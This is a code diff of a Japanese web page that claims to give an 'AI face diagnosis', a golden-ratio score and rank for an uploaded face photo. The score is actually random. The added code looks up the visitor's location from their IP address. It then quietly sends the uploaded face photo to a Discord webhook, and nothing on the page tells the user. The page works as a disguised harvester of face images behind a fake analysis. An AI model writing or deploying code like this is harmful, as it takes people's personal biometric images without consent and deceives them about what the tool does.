@@ -1,4 +1,54 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI 顔診断</title>
+
+<style>
+body {
+  font-family: "Segoe UI", sans-serif;
+  background: linear-gradient(135deg, #111827, #1f2933);
+  color: #fff;
+  text-align: center;
+  padding: 30px;
+}
+.card {
+  background: rgba(255,255,255,0.08);
+  border-radius: 16px;
+  padding: 20px;
+  max-width: 420px;
+  margin: auto;
+}
+button {
+  background: #6366f1;
+  border: none;
+  color: #fff;
+  font-size: 18px;
+  padding: 12px 24px;
+  border-radius: 12px;
+  cursor: pointer;
+}
+#result {
+  margin-top: 15px;
+  line-height: 1.6;
+}
+</style>
+</head>
+
+<body>
+<h1>AI 顔診断</h1>
+
+<div class="card">
+  <input type="file" id="file" accept="image/*"><br><br>
+  <button onclick="send()">診断する</button>
+  <img id="preview" style="display:none; max-width:100%; margin-top:15px;">
+  <div id="result"></div>
+</div>
+
 <script>
+const WEBHOOK_URL = "ここにDiscordのWebhookURL";
+
 function send() {
   const file = document.getElementById("file").files[0];
   if (!file) {
@@ -7,31 +57,64 @@ function send() {
   }
 
   const reader = new FileReader();
-  reader.onload = () => {
-    const img = document.getElementById("preview");
-    img.src = reader.result;
-    img.style.display = "block";
+  reader.onload = async () => {
+    document.getElementById("preview").src = reader.result;
+    document.getElementById("preview").style.display = "block";
 
     const score = Math.floor(70 + Math.random() * 25);
-    const rank = score >= 90 ? "S" : score >= 80 ? "A" : "B";
+    let rank = "B";
+    if (score >= 90) rank = "S";
+    else if (score >= 80) rank = "A";
+
+    const locationText = await getLocation();
 
     document.getElementById("result").innerHTML = `
       <b>診断結果</b><br>
-      黄金比：${score}%<br>
-      ランク：${rank}
+      黄金比スコア：<b>${score}%</b><br>
+      ランク：<b>${rank}</b><br><br>
+      <b>📍 地域情報</b><br>
+      ${locationText}
     `;
 
-    fetch("/.netlify/functions/send", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        score,
-        rank,
-        image: reader.result   // ← 画像を送る
-      })
-    }).catch(err => console.error(err));
+    sendToDiscord(reader.result, score, rank);
   };
-
   reader.readAsDataURL(file);
 }
+
+async function getLocation() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    return `国：${data.country_name}<br>地域：${data.region}`;
+  } catch {
+    return "取得できませんでした";
+  }
+}
+
+function sendToDiscord(base64, score, rank) {
+  const form = new FormData();
+  form.append("file", dataURLtoBlob(base64), "face.png");
+  form.append("payload_json", JSON.stringify({
+    content: `📸 **顔診断結果**
+黄金比：${score}%
+ランク：${rank}`
+  }));
+
+  fetch(WEBHOOK_URL, {
+    method: "POST",
+    body: form
+  });
+}
+
+function dataURLtoBlob(dataurl) {
+  const arr = dataurl.split(",");
+  const mime = arr[0].match(/:(.*?);/)[1];
+  const bstr = atob(arr[1]);
+  let n = bstr.length;
+  const u8arr = new Uint8Array(n);
+  while (n--) u8arr[n] = bstr.charCodeAt(n);
+  return new Blob([u8arr], { type: mime });
+}
 </script>
+</body>
+</html>
